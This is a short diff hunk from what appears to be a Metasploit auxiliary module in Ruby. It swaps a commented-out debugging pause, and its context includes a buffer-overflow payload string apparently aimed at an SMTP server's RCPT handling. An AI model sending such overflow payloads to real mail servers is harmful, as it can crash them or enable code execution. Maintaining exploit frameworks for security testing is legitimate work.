@@ -45,7 +45,7 @@ class Metasploit3 < Msf::Auxiliary
 			# because we send our own malicious RCPT.
 			# however we want to make use of MAILFROM
 			# and raw_send_recv()
-			#sleep(23) # so we can attach gdb to the child PID
+			#select(nil,nil,nil,23) # so we can attach gdb to the child PID
 
 			sploit = ("A" * 255 + ";") * 4 + "A" * 217 + ";" + "\x5c\xff" * 28
 
